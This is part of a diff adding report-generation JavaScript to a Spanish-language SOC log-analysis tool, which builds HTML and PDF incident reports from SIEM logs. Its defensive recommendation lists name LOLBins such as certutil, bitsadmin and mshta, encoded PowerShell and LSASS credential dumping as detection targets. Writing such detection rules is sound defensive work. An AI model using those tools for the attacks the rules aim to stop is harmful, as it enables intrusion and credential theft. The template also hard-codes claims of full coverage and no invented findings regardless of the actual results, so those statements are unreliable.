+   return {F,M,d,sevCount,risk,exec};
+}
+
+function suspiciousRows(){ return state.rows.filter(r=>r.riskCls&&r.riskCls.sev!=='Sin riesgo'); }
+
+function renderReport(){
+  if(!state.analyzed){ $('reportContent').innerHTML='<div class="empty" style="color:#5a6b85">Ejecuta primero el análisis para generar el informe.</div>'; return; }
+  const {F,M,d,sevCount,risk,exec}=buildReportData();
+  const analyst=esc($('analystName').value.trim()||'(sin especificar)');
+  const iocRows=[
+    ...[...state.iocs.ips].map(v=>['IP de origen',v]),
+    ...[...state.iocs.users].map(v=>['Cuenta de usuario',v]),
+    ...[...state.iocs.hosts].map(v=>['Equipo / servidor',v]),
+    ...[...state.iocs.cmds].slice(0,14).map(v=>['Comando / proceso',v.slice(0,120)])
+  ];
+  const susp=suspiciousRows();
+  $('reportContent').innerHTML=`
+  <h1>Informe Técnico de Análisis de Eventos de Ciberseguridad</h1>
+  <table>
+    <tr><td><b>Cliente</b></td><td>Organización cliente — Estocolmo, Suecia</td></tr>
+    <tr><td><b>Analista SOC L2</b></td><td>${analyst}</td></tr>
+    <tr><td><b>Fecha del informe</b></td><td>${nowStr()}</td></tr>
+    <tr><td><b>Fuente de datos</b></td><td>${esc(state.fileName)} — ${M.totalRows} registros exportados del SIEM</td></tr>
+    <tr><td><b>Periodo cubierto</b></td><td>${fmtTs(M.minTs)} → ${fmtTs(M.maxTs)}</td></tr>
+    <tr><td><b>Cobertura de clasificación</b></td><td>${M.totalRows}/${M.totalRows} eventos clasificados individualmente (100%) — Crítico: ${d['Crítico']} · Alto: ${d['Alto']} · Medio: ${d['Medio']} · Bajo: ${d['Bajo']} · Sin riesgo: ${d['Sin riesgo']}</td></tr>
+    <tr><td><b>Riesgo global</b></td><td><span class="rp-sev" style="background:rgb(${SEV_RGB[risk].join(',')})">${risk.toUpperCase()}</span></td></tr>
+    <tr><td><b>Clasificación</b></td><td>CONFIDENCIAL — Uso restringido al equipo de respuesta</td></tr>
+  </table>
+
+  <h2>1. Resumen ejecutivo</h2>
+  <p>${exec}</p>
+  <p>Distribución de hallazgos: Crítico <b>${sevCount('Crítico')}</b> · Alto <b>${sevCount('Alto')}</b> · Medio <b>${sevCount('Medio')}</b> · Bajo <b>${sevCount('Bajo')}</b>. Categorías detectadas: ${[...new Set(F.map(f=>f.cat))].join(', ')||'ninguna'}.</p>
+
+  <h2>2. Alcance y metodología</h2>
+  <p>El análisis se realizó íntegramente sobre el archivo de logs entregado por el cliente, mediante: (a) normalización y enriquecimiento de los registros (mapeo de timestamps, usuarios, IPs y equipos); (b) aplicación de reglas de detección alineadas con MITRE ATT&CK para seis familias — fuerza bruta, comandos y procesos sospechosos, inicios de sesión anómalos, movimiento lateral, escalamiento de privilegios y otras anomalías; (c) correlación automatizada asistida por IA entre hallazgos que comparten entidades (IP, cuenta, host), reconstruyendo cadenas de ataque; (d) clasificación de riesgo con justificación basada en la evidencia; y (e) <b>clasificación individual exhaustiva de cada uno de los ${M.totalRows} registros</b>, asignando a cada evento un nivel de riesgo (Crítico/Alto/Medio/Bajo/Sin riesgo) con su justificación, de modo que ningún evento quede sin evaluar. <b>Rigor analítico:</b> cada hallazgo cita las filas exactas del archivo que lo sustentan; ningún hallazgo fue inventado ni extrapolado más allá de los datos suministrados.</p>
+
+  <h2>3. Indicadores de Compromiso (IoC) extraídos de los logs</h2>
+  ${iocRows.length?`<table><thead><tr><th>Tipo</th><th>Valor</th></tr></thead><tbody>${iocRows.map(r=>`<tr><td>${r[0]}</td><td style="font-family:'JetBrains Mono',monospace;font-size:11px">${esc(r[1])}</td></tr>`).join('')}</tbody></table>`:'<p>No se extrajeron IoC de los registros analizados.</p>'}
+
+  <h2>4. Hallazgos identificados — explicación técnica, evidencia y criticidad</h2>
+  ${F.map(f=>`
+    <h3>${f.id}. ${esc(f.title)} <span class="rp-sev" style="background:rgb(${SEV_RGB[f.sev].join(',')})">${f.sev.toUpperCase()}</span></h3>
+    <p><b>Categoría:</b> ${f.cat}${f.chainId?` · <b>Correlación:</b> ${f.chainId}`:''} · <b>Primera ocurrencia:</b> ${fmtTs(f.firstTs)} · <b>Registros coincidentes:</b> ${f.evCount} (todos incluidos en el Anexo A)</p>
+    <p><b>Explicación técnica:</b> ${esc(f.tech)}${f.chainNote?' '+esc(f.chainNote.trim()):''}</p>
+    <p><b>Criticidad y justificación:</b> ${esc(f.justification)}</p>
+    <p><b>Impacto potencial:</b> ${esc(f.impact)}</p>
+    <p><b>Evidencias encontradas en los logs (${Math.min(f.evCount,8)} de ${f.evCount} mostradas):</b></p>
+    <pre>${f.evidence.map(e=>`[Fila ${e.row}] ${e.ts} :: ${esc(e.text)}`).join('\n')}${f.evCount>f.evidence.length?`\n… y ${f.evCount-f.evidence.length} registro(s) adicional(es) — ver Anexo A`:''}</pre>
+    <p><b>Acciones específicas:</b></p><ul>${f.actions.map(a=>`<li>${esc(a)}</li>`).join('')}</ul>`).join('')||'<p>No se identificaron hallazgos en los registros analizados.</p>'}
+
+  <h2>5. Correlación de eventos — cadenas de ataque reconstruidas</h2>
+  ${state.chains.length?state.chains.map(c=>`
+    <h3>${c.id} · ${c.findings.length} hallazgos vinculados · Fases: ${c.cats.join(' → ')}</h3>
+    <p>${esc(c.narrative)}</p>
+    <p><b>Entidades vinculadas:</b> ${c.ips.length?'IPs: '+c.ips.join(', '):''} ${c.users.length?'· Usuarios: '+c.users.join(', '):''} ${c.hosts.length?'· Equipos: '+c.hosts.join(', '):''}</p>
+    <p><b>Conclusión del analista:</b> ${c.cats.length>=3?'La presencia de ≥3 fases encadenadas sobre entidades comunes permite concluir, con la evidencia disponible, que existió <b>un único incidente coordinado</b> (intrusión multi-etapa) y no eventos independientes.':'La evidencia disponible vincula estos eventos como parte de actividad relacionada; se recomienda confirmar con logs adicionales del mismo periodo.'}</p>`).join('')
+   :'<p>Los hallazgos detectados no comparten entidades entre sí; se documentan como eventos independientes. No hay evidencia en los logs para afirmar un incidente coordinado.</p>'}
+
+  <h2>6. Clasificación de riesgos (resumen de hallazgos)</h2>
+  <table><thead><tr><th>ID</th><th>Hallazgo</th><th>Categoría</th><th>Criticidad</th><th>Justificación resumida</th></tr></thead>
+  <tbody>${F.map(f=>`<tr><td>${f.id}</td><td>${esc(f.title)}</td><td>${f.cat}</td>
+    <td><span class="rp-sev" style="background:rgb(${SEV_RGB[f.sev].join(',')})">${f.sev.toUpperCase()}</span></td>
+    <td>${esc(f.justification.slice(0,150))}…</td></tr>`).join('')}</tbody></table>
+  <h3>6.1 Clasificación individual de los ${M.totalRows} eventos (cobertura 100%)</h3>
+  <table><thead><tr><th>Nivel de riesgo</th><th>Nº de eventos</th><th>% del total</th></tr></thead>
+  <tbody>
+    <tr><td><span class="rp-sev" style="background:rgb(239,68,68)">CRÍTICO</span></td><td>${d['Crítico']}</td><td>${(d['Crítico']/M.totalRows*100).toFixed(1)}%</td></tr>
+    <tr><td><span class="rp-sev" style="background:rgb(249,115,22)">ALTO</span></td><td>${d['Alto']}</td><td>${(d['Alto']/M.totalRows*100).toFixed(1)}%</td></tr>
+    <tr><td><span class="rp-sev" style="background:rgb(234,179,8)">MEDIO</span></td><td>${d['Medio']}</td><td>${(d['Medio']/M.totalRows*100).toFixed(1)}%</td></tr>
+    <tr><td><span class="rp-sev" style="background:rgb(34,197,94)">BAJO</span></td><td>${d['Bajo']}</td><td>${(d['Bajo']/M.totalRows*100).toFixed(1)}%</td></tr>
+    <tr><td><span class="rp-sev" style="background:rgb(100,116,139)">SIN RIESGO</span></td><td>${d['Sin riesgo']}</td><td>${(d['Sin riesgo']/M.totalRows*100).toFixed(1)}%</td></tr>
+    <tr><td><b>TOTAL</b></td><td><b>${M.totalRows}</b></td><td><b>100%</b></td></tr>
+  </tbody></table>
+
+  <h2>7. Plan de acción — Investigar · Contener · Remediar</h2>
+  <h3>7.1 Investigación (0–24 h)</h3>
+  <ul>
+    <li>Preservar evidencia: imágenes forenses de los equipos citados (${[...state.iocs.hosts].slice(0,8).join(', ')||'según hallazgos'}) antes de cualquier cambio.</li>
+    <li>Ampliar la ventana temporal de logs del SIEM (±7 días) para identificar el alcance real del acceso inicial.</li>
+    <li>Analizar en sandbox los comandos y binarios documentados en la sección 4; obtener hashes y buscarlos en todo el parque.</li>
+    <li>Entrevistar a los titulares de las cuentas involucradas (${[...state.iocs.users].slice(0,6).join(', ')||'N/A'}) para descartar actividad legítima.</li>
+    <li>Revisar uno a uno los ${susp.length} eventos clasificados con riesgo del Anexo A para confirmar o descartar cada caso.</li>
+  </ul>
+  <h3>7.2 Contención (inmediata, 0–48 h)</h3>
+  <ul>
+    <li>Bloquear en firewall/perímetro las IPs identificadas como maliciosas: ${[...state.iocs.ips].filter(ip=>!/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)).join(', ')||'según sección 3'}.</li>
+    <li>Aislar de la red (VLAN de cuarentena) los equipos con hallazgos críticos.</li>
+    <li>Deshabilitar las cuentas creadas/comprometidas y forzar reset de credenciales + revocación de tokens y sesiones activas.</li>
+    <li>Eliminar servicios, tareas programadas y claves de persistencia documentados.</li>
+    <li>Verificar integridad de respaldos offline ante indicadores de pre-ransomware.</li>
+  </ul>
+  <h3>7.3 Remediación y recuperación (48 h – 2 semanas)</h3>
+  <ul>
+    <li>Reconstruir (reimage) los equipos con compromiso privilegiado confirmado en lugar de limpiarlos in-place.</li>
+    <li>Rotar credenciales de cuentas de servicio y administrativas expuestas; aplicar secretos gestionados.</li>
+    <li>Reactivar y endurecer las defensas deshabilitadas (firewall, AV/EDR, logging).</li>
+    <li>Restaurar logs y monitorización; validar que los EventID críticos vuelven a recibirse en el SIEM.</li>
+    <li>Lecciones aprendidas: informe de cierre y actualización de reglas de detección del SIEM.</li>
+  </ul>
+
+  <h2>8. Recomendaciones generales de seguridad</h2>
+  <ul>
+    <li><b>MFA obligatorio</b> en VPN, acceso remoto y cuentas privilegiadas (mitiga el vector de acceso observado en este incidente).</li>
+    <li><b>Políticas de lockout</b> y rate-limiting en autenticación; alertas en tiempo real ante ≥3 fallos por origen.</li>
+    <li><b>PowerShell ScriptBlock Logging + Transcription</b>, Constrained Language Mode y bloqueo de -EncodedCommand en estaciones no administrativas.</li>
+    <li><b>Segmentación de red</b>: restringir RDP/SMB entre estaciones y servidores; habilitar LAPS y restringir cuentas locales de administrador.</li>
+    <li><b>EDR con reglas para LOLBins</b> (certutil, bitsadmin, rundll32, mshta) y protección anti LSASS (Credential Guard).</li>
+    <li><b>Logs inmutables</b>: reenvío en tiempo real del log de Seguridad a un repositorio WORM para evitar borrados anti-forenses.</li>
+    <li><b>Respaldos 3-2-1</b> con copia offline/inmutable probada periódicamente.</li>
+    <li><b>Monitorización GDPR/NIS2</b>: procedimiento de notificación a autoridad en ≤72 h si se confirma exfiltración de datos personales.</li>
+    <li><b>Threat hunting periódico</b> sobre las seis familias de detección cubiertas por esta herramienta.</li>
+  </ul>
+
+  <h2>Anexo A — Clasificación individual de los ${susp.length} eventos con riesgo</h2>
+  <p>Listado exhaustivo de <b>todos</b> los registros clasificados con riesgo Crítico, Alto, Medio o Bajo (los ${d['Sin riesgo']} eventos restantes fueron evaluados y clasificados como actividad normal según la línea base). La clasificación completa de los ${M.totalRows} eventos —incluidos los normales— está disponible en la exportación Excel «Clasificación_completa_eventos» generada por esta herramienta.</p>
+  <details>
+    <summary>▶ Desplegar Anexo A completo (${susp.length} eventos con riesgo)</summary>
+    <table><thead><tr><th>Fila</th><th>Timestamp</th><th>Riesgo</th><th>Justificación</th><th>Registro</th></tr></thead>
+    <tbody>${susp.map(r=>`<tr><td>${r.idx+2}</td><td style="font-family:'JetBrains Mono',monospace;font-size:10.5px">${fmtTs(r.ts)}</td>
+      <td><span class="rp-sev" style="background:rgb(${SEV_RGB[r.riskCls.sev].join(',')})">${r.riskCls.sev.toUpperCase()}</span></td>
+      <td style="font-size:11px">${esc(r.riskCls.reason)}</td>
+      <td style="font-family:'JetBrains Mono',monospace;font-size:10px">${esc(r.raw.slice(0,220))}</td></tr>`).join('')}</tbody></table>
+  </details>
+
+  <h2>9. Declaración de rigor analítico</h2>
+  <p>Este informe fue redactado con asistencia de IA a partir <b>únicamente</b> de los registros contenidos en el archivo proporcionado por el cliente (${esc(state.fileName)}). Cada hallazgo referencia las filas exactas del archivo que lo evidencian y cada uno de los ${M.totalRows} eventos fue clasificado individualmente (cobertura 100%), sin omitir registros. Las limitaciones del análisis (ventana temporal acotada, posibles logs borrados — ver hallazgos anti-forenses si existen — y ausencia de telemetría de red complementaria) deben considerarse al dimensionar el incidente. No se integró ninguna fuente externa (p. ej., Microsoft Sentinel).</p>
+  <p style="margin-top:20px;color:#5a6b85"><i>Documento generado por CyberSOC Analyst · ${nowStr()} · Analista SOC L2: ${analyst}</i></p>`;
+  markDone('informe');
+}
+
+/* ============================================================
+   EXPORTACIÓN A PDF (jsPDF — construcción manual, robusta)
+============================================================ */
+function exportPDF(){
+  try{
+    if(!state.analyzed){ toast('Ejecuta el análisis antes de exportar.','err'); return; }
+    const analyst=$('analystName').value.trim();
+    if(!analyst){ toast('Indica el nombre del Analista SOC L2 en la cabecera antes de exportar el informe.','err'); $('analystName').focus(); showSec('carga'); return; }
+    const { jsPDF } = window.jspdf;
+    const doc=new jsPDF({unit:'mm',format:'a4'});
+    const W=210, ML=18, MR=W-18, CW=MR-ML;
+    let y=0;
+    const PAGE_BOTTOM=282;
+    const ensure=h=>{ if(y+h>PAGE_BOTTOM){ doc.addPage(); y=22; } };
+    const H1=t=>{ ensure(16); doc.setFont('helvetica','bold'); doc.setFontSize(16); doc.setTextColor(11,58,102);
+      const ls=doc.splitTextToSize(t,CW); doc.text(ls,ML,y); y+=ls.length*7+2;
+      doc.setDrawColor(6,182,212); doc.setLineWidth(.8); doc.line(ML,y,MR,y); y+=8; doc.setTextColor(30,40,60); };
+    const H2=t=>{ ensure(12); doc.setFont('helvetica','bold'); doc.setFontSize(12.5); doc.setTextColor(11,58,102);
+      const ls=doc.splitTextToSize(t,CW); doc.text(ls,ML,y); y+=ls.length*6+3; doc.setTextColor(30,40,60); };
+    const H3=t=>{ ensure(10); doc.setFont('helvetica','bold'); doc.setFontSize(11); doc.setTextColor(19,78,122);
+      const ls=doc.splitTextToSize(t,CW); doc.text(ls,ML,y); y+=ls.length*5.5+2; doc.setTextColor(30,40,60); };
+    const P=(t,size=10,style='normal')=>{ ensure(8); doc.setFont('helvetica',style); doc.setFontSize(size);
+      const ls=doc.splitTextToSize(String(t),CW);
+      ls.forEach(line=>{ if(y>PAGE_BOTTOM){doc.addPage();y=22;} doc.text(line,ML,y); y+=size*0.52; });
+      y+=2; doc.setFont('helvetica','normal'); };
+    const BULLET=(items,size=10)=>items.forEach(it=>{ ensure(8); doc.setFont('helvetica','normal'); doc.setFontSize(size);
+      const ls=doc.splitTextToSize('•  '+it,CW-4);
+      ls.forEach((line,i)=>{ if(y>PAGE_BOTTOM){doc.addPage();y=22;} doc.text(line,ML+(i===0?0:4),y); y+=size*0.52; });
+      y+=1.5; });
+    const SEVBADGE=(sev,x,yy)=>{ const c=SEV_RGB[sev]||[100,100,100]; doc.setFillColor(c[0],c[1],c[2]);
+      doc.roundedRect(x,yy-4,doc.getTextWidth(sev.toUpperCase())+8,6,1.5,1.5,'F');
+      doc.setFont('helvetica','bold'); doc.setFontSize(8.5); doc.setTextColor(255,255,255);
+      doc.text(sev.toUpperCase(),x+4,yy); doc.setTextColor(30,40,60); doc.setFont('helvetica','normal'); };
+    const EVIDENCE=lines=>{ doc.setFont('courier','normal'); doc.setFontSize(7.6);
+      lines.forEach(l=>{ const ls=doc.splitTextToSize(l,CW-6);
+        ls.forEach(line=>{ if(y>PAGE_BOTTOM){doc.addPage();y=22;}
+          doc.setFillColor(13,21,38); doc.rect(ML,y-3.4,CW,4.2,'F');
+          doc.setTextColor(159,232,245); doc.text(line,ML+3,y); y+=4.2; }); });
+      doc.setTextColor(30,40,60); doc.setFont('helvetica','normal'); y+=3; };
+
+    /* ---- PORTADA ---- */
+    y=40;
+    doc.setFillColor(7,11,20); doc.rect(0,0,W,297,'F');
+    doc.setFillColor(6,182,212); doc.rect(0,96,W,1.2,'F');
+    doc.setFont('helvetica','bold'); doc.setFontSize(30); doc.setTextColor(230,237,247);
+    doc.text('INFORME TÉCNICO',ML,120);
+    doc.setFontSize(17); doc.setTextColor(34,211,238);
+    doc.text('Análisis de Eventos de Ciberseguridad',ML,132);
+    doc.setFont('helvetica','normal'); doc.setFontSize(11); doc.setTextColor(139,160,194);
+    doc.text('Asistido por IA · Consultora SOC — Estocolmo, Suecia',ML,141);
+    doc.setFontSize(10); doc.setTextColor(230,237,247);
+    const {F,M,d,sevCount,risk}=buildReportData();
+    const susp=suspiciousRows();
+    const cover=[
+      ['Analista SOC L2:',analyst],
+      ['Fecha de emisión:',nowStr()],
+      ['Fuente de datos:',state.fileName],
+      ['Registros analizados:',`${M.totalRows} (clasificación individual: 100% de cobertura)`],
+      ['Clasificación por evento:',`Crítico ${d['Crítico']} · Alto ${d['Alto']} · Medio ${d['Medio']} · Bajo ${d['Bajo']} · Sin riesgo ${d['Sin riesgo']}`],
+      ['Periodo cubierto:',`${fmtTs(state.meta.minTs)}  →  ${fmtTs(state.meta.maxTs)}`],
+      ['Hallazgos:',`${F.length} (Críticos: ${sevCount('Crítico')} · Altos: ${sevCount('Alto')})`],
+      ['Riesgo global:',risk.toUpperCase()],
+      ['Clasificación:','CONFIDENCIAL — uso restringido']
+    ];
+    let cy=158;
+    cover.forEach(([k,v])=>{
+      const ls=doc.splitTextToSize(v,118);
+      doc.setFont('helvetica','bold'); doc.setTextColor(34,211,238); doc.text(k,ML,cy);
+      doc.setFont('helvetica','normal'); doc.setTextColor(230,237,247);
+      ls.forEach((line,i)=>doc.text(line,ML+44,cy+i*5));
+      cy+=Math.max(ls.length,1)*5+3;
+    });
+    doc.setFontSize(8); doc.setTextColor(90,110,140);
+    doc.text('Generado con CyberSOC Analyst v2.5 · Documento sustentado exclusivamente en los registros proporcionados por el cliente.',ML,280);
+
+    /* ---- CUERPO ---- */
+    doc.addPage(); y=22;
+    const plain=html=>String(html).replace(/<[^>]+>/g,'');
+    H1('1. Resumen ejecutivo');
+    P(plain(buildReportData().exec));
+    P(`Distribución de hallazgos — Crítico: ${sevCount('Crítico')} · Alto: ${sevCount('Alto')} · Medio: ${sevCount('Medio')} · Bajo: ${sevCount('Bajo')}. Categorías: ${[...new Set(F.map(f=>f.cat))].join(', ')||'ninguna'}.`);
+
+    H1('2. Alcance y metodología');
+    P('El análisis se realizó íntegramente sobre el archivo de logs entregado por el cliente mediante: (a) normalización y enriquecimiento de registros; (b) reglas de detección alineadas con MITRE ATT&CK para seis familias (fuerza bruta, comandos y procesos, inicios sospechosos, movimiento lateral, escalamiento, otras anomalías); (c) correlación asistida por IA entre hallazgos que comparten entidades (IP, cuenta, equipo); (d) clasificación de riesgo con justificación basada en evidencia; y (e) clasificación individual exhaustiva de los '+M.totalRows+' registros, asignando a cada evento un nivel de riesgo con su justificación, de modo que ningún evento quedó fuera del análisis. Cada hallazgo cita las filas exactas del archivo que lo sustentan: no se inventó ni extrapoló ninguna conclusión más allá de los datos suministrados.');
+
+    H1('3. Indicadores de Compromiso (IoC)');
+    const iocs=[
+      ...[...state.iocs.ips].map(v=>['IP de origen',v]),
+      ...[...state.iocs.users].map(v=>['Cuenta',v]),
+      ...[...state.iocs.hosts].map(v=>['Equipo',v]),
+      ...[...state.iocs.cmds].slice(0,14).map(v=>['Comando',v.slice(0,110)])
+    ];
+    if(iocs.length){
+      doc.setFont('helvetica','bold'); doc.setFontSize(9);
+      doc.setFillColor(11,58,102); doc.setTextColor(255,255,255);
+      doc.rect(ML,y,CW,7,'F'); doc.text('TIPO',ML+2,y+5); doc.text('VALOR',ML+40,y+5); y+=7;
+      doc.setTextColor(30,40,60); doc.setFont('helvetica','normal');
+      iocs.forEach((r,i)=>{
+        const ls=doc.splitTextToSize(r[1],CW-44);
+        const h=Math.max(ls.length*4.4,6)+1.5; ensure(h);
+        if(i%2===0){doc.setFillColor(240,244,249);doc.rect(ML,y,CW,h,'F');}
+        doc.setFontSize(8.5); doc.text(r[0],ML+2,y+4.2);
+        doc.setFont('courier','normal'); ls.forEach((line,k)=>doc.text(line,ML+40,y+4.2+k*4.4));
+        doc.setFont('helvetica','normal'); y+=h;
+      });
+      y+=4;
+    } else P('No se extrajeron IoC de los registros analizados.');
+
+    H1('4. Hallazgos identificados');
+    F.forEach(f=>{
+      ensure(30);
+      H3(`${f.id}. ${f.title}`);
+      SEVBADGE(f.sev,MR-34,y-4); y+=4;
+      P(`Categoría: ${f.cat}${f.chainId?` · Correlación: ${f.chainId}`:''} · Primera ocurrencia: ${fmtTs(f.firstTs)} · Registros coincidentes: ${f.evCount}`,9);
+      P('Explicación técnica: '+f.tech+(f.chainNote?' '+f.chainNote.trim():''),9.5);
+      P('Criticidad y justificación: ['+f.sev+'] '+f.justification,9.5);
+      P('Impacto potencial en la organización: '+f.impact,9.5);
+      P(`Evidencias encontradas en los logs (${Math.min(f.evCount,8)} de ${f.evCount} mostradas; el resto en Anexo A):`,9.5,'bold');
+      EVIDENCE(f.evidence.map(e=>`[Fila ${e.row}] ${e.ts} :: ${e.text.slice(0,180)}`).concat(f.evCount>f.evidence.length?[`… y ${f.evCount-f.evidence.length} registro(s) adicional(es) — ver Anexo A`]:[]));
+      P('Acciones recomendadas:',9.5,'bold');
+      BULLET(f.actions,9.5);
+      doc.setDrawColor(210,220,232); doc.setLineWidth(.3); ensure(6); doc.line(ML,y,MR,y); y+=6;
+    });
+
+    H1('5. Correlación de eventos — cadenas de ataque');
+    if(state.chains.length){
+      state.chains.forEach(c=>{
+        H3(`${c.id} · ${c.findings.length} hallazgos vinculados · Fases: ${c.cats.join(' → ')}`);
+        P(c.narrative,9.5);
+        P(`Entidades vinculadas — ${c.ips.length?'IPs: '+c.ips.join(', '):''} ${c.users.length?'· Usuarios: '+c.users.join(', '):''} ${c.hosts.length?'· Equipos: '+c.hosts.join(', '):''}`,9.5);
+        P('Conclusión: '+(c.cats.length>=3
+          ? 'la presencia de tres o más fases encadenadas sobre entidades comunes permite concluir, con la evidencia disponible, que se trató de UN ÚNICO INCIDENTE COORDINADO (intrusión multi-etapa) y no de eventos independientes.'
+          : 'la evidencia vincula estos eventos como actividad relacionada; se recomienda confirmar con logs adicionales del mismo periodo.'),9.5);
+      });
+    } else {
+      P('Los hallazgos detectados no comparten entidades entre sí y se documentan como eventos independientes. No existe evidencia en los logs para afirmar un incidente coordinado.',9.5);
+    }
+
+    H1('6. Clasificación de riesgos');
+    H2('6.1 Resumen de hallazgos');
+    ensure(12);
+    doc.setFillColor(11,58,102); doc.setTextColor(255,255,255); doc.setFont('helvetica','bold'); doc.setFontSize(9);
+    doc.rect(ML,y,CW,7,'F'); doc.text('ID',ML+2,y+5); doc.text('HALLAZGO',ML+16,y+5); doc.text('CRITICIDAD',MR-34,y+5); y+=7;
+    doc.setTextColor(30,40,60); doc.setFont('helvetica','normal');
+    F.forEach((f,i)=>{
+      const ls=doc.splitTextToSize(`${f.title} (${f.cat})`,CW-64);
+      const h=Math.max(ls.length*4.4,7)+1; ensure(h);
+      if(i%2===0){doc.setFillColor(240,244,249);doc.rect(ML,y,CW,h,'F');}
+      doc.setFontSize(8.5); doc.text(f.id,ML+2,y+4.6);
+      ls.forEach((line,k)=>doc.text(line,ML+16,y+4.6+k*4.4));
+      const c=SEV_RGB[f.sev]; doc.setFillColor(c[0],c[1],c[2]); doc.roundedRect(MR-34,y+1.2,32,5,1.2,1.2,'F');
+      doc.setTextColor(255,255,255); doc.setFontSize(7.5); doc.setFont('helvetica','bold');
+      doc.text(f.sev.toUpperCase(),MR-32,y+4.8); doc.setFont('helvetica','normal'); doc.setTextColor(30,40,60);
+      y+=h;
+    });
+    y+=4;
+    P(`Riesgo global del incidente: ${risk.toUpperCase()} — determinado por la criticidad máxima presente y la correlación multi-etapa descrita en la sección 5.`,10,'bold');
+
+    H2(`6.2 Clasificación individual de los ${M.totalRows} eventos (cobertura 100%)`);
+    ensure(10);
+    doc.setFillColor(11,58,102); doc.setTextColor(255,255,255); doc.setFont('helvetica','bold'); doc.setFontSize(9);
+    doc.rect(ML,y,CW,7,'F'); doc.text('NIVEL DE RIESGO',ML+2,y+5); doc.text('EVENTOS',ML+80,y+5); doc.text('% DEL TOTAL',ML+115,y+5); y+=7;
+    doc.setTextColor(30,40,60); doc.setFont('helvetica','normal'); doc.setFontSize(9);
+    [['CRÍTICO',d['Crítico'],[239,68,68]],['ALTO',d['Alto'],[249,115,22]],['MEDIO',d['Medio'],[234,179,8]],['BAJO',d['Bajo'],[34,197,94]],['SIN RIESGO',d['Sin riesgo'],[100,116,139]]].forEach(([lbl,n,c])=>{
+      ensure(8);
+      doc.setFillColor(c[0],c[1],c[2]); doc.roundedRect(ML+2,y-4,34,5.5,1.2,1.2,'F');
+      doc.setTextColor(255,255,255); doc.setFont('helvetica','bold'); doc.setFontSize(8); doc.text(lbl,ML+5,y);
+      doc.setTextColor(30,40,60); doc.setFont('helvetica','normal'); doc.setFontSize(9);
+      doc.text(String(n),ML+80,y); doc.text((n/M.totalRows*100).toFixed(1)+'%',ML+115,y);
+      y+=8;
+    });
+    ensure(8); doc.setFont('helvetica','bold'); doc.text(`TOTAL: ${M.totalRows} eventos clasificados individualmente — 100% de cobertura.`,ML+2,y); doc.setFont('helvetica','normal'); y+=7;
+
+    H1('7. Plan de acción');
+    H2('7.1 Investigación (0–24 h)');
+    BULLET([
+      `Preservar evidencia: imágenes forenses de los equipos citados (${[...state.iocs.hosts].slice(0,8).join(', ')||'según sección 4'}) antes de cualquier modificación.`,
+      'Ampliar la ventana temporal de logs del SIEM (±7 días) para dimensionar el acceso inicial.',
+      'Analizar en sandbox los comandos/binarios documentados; obtener hashes y buscarlos en todo el parque.',
+      `Entrevistar a los titulares de las cuentas involucradas (${[...state.iocs.users].slice(0,6).join(', ')||'N/A'}) para descartar actividad legítima.`,
+      `Revisar uno a uno los ${susp.length} eventos con riesgo listados en el Anexo A para confirmar o descartar cada caso.`
+    ]);
+    H2('7.2 Contención (0–48 h)');
+    BULLET([
+      `Bloquear en firewall/perímetro las IPs maliciosas externas: ${[...state.iocs.ips].filter(ip=>!/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)).join(', ')||'ver sección 3'}.`,
+      'Aislar en VLAN de cuarentena los equipos con hallazgos críticos.',
+      'Deshabilitar cuentas creadas/comprometidas; reset de credenciales y revocación de tokens y sesiones.',
+      'Eliminar servicios, tareas programadas y claves de persistencia documentadas.',
+      'Verificar integridad y disponibilidad de respaldos offline (indicadores de pre-ransomware).'
+    ]);
+    H2('7.3 Remediación y recuperación (48 h – 2 semanas)');
+    BULLET([
+      'Reconstruir (reimage) los equipos con compromiso privilegiado confirmado.',
+      'Rotar credenciales de servicio y administrativas expuestas; adoptar gestión de secretos.',
+      'Reactivar y endurecer las defensas deshabilitadas (firewall, AV/EDR, auditoría).',
+      'Restaurar la monitorización y validar recepción de EventIDs críticos en el SIEM.',
+      'Sesión de lecciones aprendidas y actualización de reglas de detección.'
+    ]);
+
+    H1('8. Recomendaciones generales de seguridad');
+    BULLET([
+      'MFA obligatorio en VPN, acceso remoto y cuentas privilegiadas (mitiga el vector de acceso observado).',
+      'Políticas de lockout y rate-limiting; alertas en tiempo real ante ≥3 fallos de autenticación por origen.',
+      'PowerShell ScriptBlock Logging + Transcription y Constrained Language Mode; bloqueo de -EncodedCommand en estaciones estándar.',
+      'Segmentación de red: restringir RDP/SMB entre estaciones y servidores; LAPS para contraseñas locales.',
+      'EDR con cobertura de LOLBins (certutil, bitsadmin, rundll32, mshta) y Credential Guard contra volcado LSASS.',
+      'Reenvío de logs en tiempo real a repositorio inmutable (WORM) para resistir borrados anti-forenses.',
+      'Respaldos 3-2-1 con copia offline probada periódicamente.',
+      'Procedimiento GDPR/NIS2: notificación a la autoridad en ≤72 h si se confirma exfiltración de datos personales.',
+      'Threat hunting periódico sobre las seis familias de detección cubiertas.'
+    ]);
+
+    H1('9. Declaración de rigor analítico');
+    P(`Este informe fue elaborado con asistencia de IA a partir únicamente de los registros contenidos en "${state.fileName}". Cada hallazgo referencia las filas exactas del archivo que lo evidencian y los ${M.totalRows} eventos fueron clasificados individualmente (cobertura 100%), sin omitir registros. Limitaciones: ventana temporal acotada de los logs, posible destrucción de evidencia (ver hallazgos anti-forenses, si aplican) y ausencia de telemetría de red complementaria. No se integró ninguna fuente externa (incluido Microsoft Sentinel).`,9.5);
+
+    /* ---- ANEXO A: clasificación individual de TODOS los eventos con riesgo ---- */
+    H1(`Anexo A — Clasificación individual de eventos con riesgo (${susp.length} de ${M.totalRows})`);
+    P(`Listado exhaustivo de todos los registros clasificados con riesgo Crítico, Alto, Medio o Bajo. Los ${d['Sin riesgo']} eventos restantes fueron igualmente evaluados y clasificados como actividad normal según la línea base (disponibles en la exportación Excel «Clasificación_completa_eventos»). Ningún registro del archivo quedó fuera del análisis.`,9);
+    doc.setFont('courier','normal'); doc.setFontSize(7.2);
+    susp.forEach(r=>{
+      const line=`[Fila ${r.idx+2}] [${r.riskCls.sev.toUpperCase()}] ${fmtTs(r.ts)} :: ${r.riskCls.reason} :: ${r.raw.slice(0,190)}`;
+      const ls=doc.splitTextToSize(line,CW-4);
+      ls.forEach((l,k)=>{
+        if(y>PAGE_BOTTOM){doc.addPage();y=22;}
+        if(k===0){ const c=SEV_RGB[r.riskCls.sev]||[100,116,139];
+          doc.setFillColor(c[0],c[1],c[2]); doc.rect(ML,y-3,1.4,3.6,'F'); }
